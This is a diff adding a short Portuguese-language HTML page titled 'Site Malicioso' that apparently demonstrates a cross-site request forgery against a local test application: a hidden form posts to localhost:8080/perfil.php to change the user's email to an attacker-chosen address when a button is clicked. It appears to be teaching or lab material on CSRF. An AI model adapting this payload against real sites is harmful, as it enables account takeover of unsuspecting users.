@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Malicioso</title>
+</head>
+<body>
+    <h1>Site malicioso</h1>
+    <button id="botao-ataque">Atacar site</button>
+
+    <form id="formularioCSRF" action="http://localhost:8080/perfil.php" method="post" style="display: none;">
+        <input type="hidden" name="novo-email" value="usuarioHackeado@email.com">
+    </form>
+
+    <script>
+        const botaoAtaque = document.getElementById("botao-ataque");
+        const formularioCSRF = document.getElementById("formularioCSRF");
+
+        botaoAtaque.addEventListener("click", () => {
+            formularioCSRF.submit();
+        })
+    </script>
+</body>
+</html>
